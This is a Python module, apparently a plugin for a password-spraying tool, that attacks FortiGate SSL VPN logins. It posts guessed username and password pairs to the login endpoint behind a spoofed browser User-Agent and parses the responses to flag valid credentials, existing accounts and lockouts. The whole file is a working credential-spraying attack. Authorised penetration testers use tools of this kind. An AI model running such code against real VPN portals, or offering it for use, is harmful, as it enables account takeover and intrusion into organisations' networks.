from .base import BaseSprayModule

class FortiVPN(BaseSprayModule):

    # HTTP method
    method = 'POST'
    # default target URL
    default_url = 'https://login-forti.evilcorp.com/remote/logincheck'
    # body of request
    #request_data = 'user={username}&pass={password}&group={otherthing}'
    request_data = 'ajax=1&username={username}&realm=&credential={password}'
    # HTTP cookies
    cookies = {}
    # Don't count nonexistent accounts as failed logons
    fail_nonexistent = False

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/137.0.3296.52',
        'Content-Type': 'text/plain;charset=UTF-8'
    }

    def initialize(self):
        '''
        Get additional arguments from user at runtime
        NOTE: These can also be passed via environment variables beginning with "TREVOR_":
            TREVOR_otherthing=asdf
        '''
        #while not self.trevor.runtimeparams.get('otherthing', ''):
        #    self.trevor.runtimeparams.update({
        #        'otherthing': input("What's that other thing? ")
        #    })

        return True


    def check_response(self, response):
        '''
        returns (valid, exists, locked, msg)
        '''

        valid = False
        exists = None
        locked = None

        status = getattr(response, 'status_code', 0)
        body = getattr(response, 'text', None)

        msg = f'status_code: {status} response: {body}'

        if status == 200 and 'redir=' in body and '&portal=' in body:
            valid = True
            exists = True
            msg = f'Valid cred {body}'

        if 'sslvpn_login_permission_denied' in body:
            valid = False
            exists = False
            msg = f'No valid {body}'

        if 'Too many bad login attempts' in body:
            locked = True
            msg = f'Blocked'

        return (valid, exists, locked, msg)
